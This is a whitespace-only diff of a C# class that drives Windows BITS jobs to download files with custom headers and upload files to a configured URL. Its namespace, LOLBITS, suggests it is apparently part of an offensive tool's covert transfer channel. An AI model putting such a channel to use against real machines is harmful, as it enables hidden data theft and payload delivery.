@@ -6,7 +6,6 @@ namespace LOLBITS
 {
     public  class Jobs
     {
-
         private static readonly Random Random = new Random();
         private readonly object _url;
         private enum JobType {Download=0, Upload=1, UploadReply=2};
@@ -42,7 +41,6 @@ namespace LOLBITS
                     jobGuid = new BITS4.GUID();
                     job = null;
                     break;
-
             }
 
             return job != null ? true : false;
@@ -56,8 +54,7 @@ namespace LOLBITS
             {
                 BITS4.BG_JOB_STATE state;
                 job.GetState(out state);
-               
-                    switch (state)
+                switch (state)
                     {
                         case BITS4.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                             job.Cancel();
@@ -75,13 +72,11 @@ namespace LOLBITS
                         default:
                             break;
                     }
-               
             }
 
             return jobCompleted ? true : false;
         }
-
-
+        
         public bool Get(string id, string filePath, string headers, BITS4.BG_JOB_PRIORITY priority)
         {
             CreateJob((int)JobType.Download, out BITS4.GUID jobGuid, out BITS4.IBackgroundCopyJob job);
@@ -94,7 +89,6 @@ namespace LOLBITS
                 jobHttpOptions?.SetCustomHeaders(headers);
             }
             
-
             //job.SetNoProgressTimeout(5); how many seconds?
             job.Resume();
             return ExecuteJob(job);
@@ -106,12 +100,7 @@ namespace LOLBITS
             job.AddFile(_url + id, @filePath);
             job.Resume();
 
-
             return ExecuteJob(job);
         }
-        
     }
-
-   
-
 }
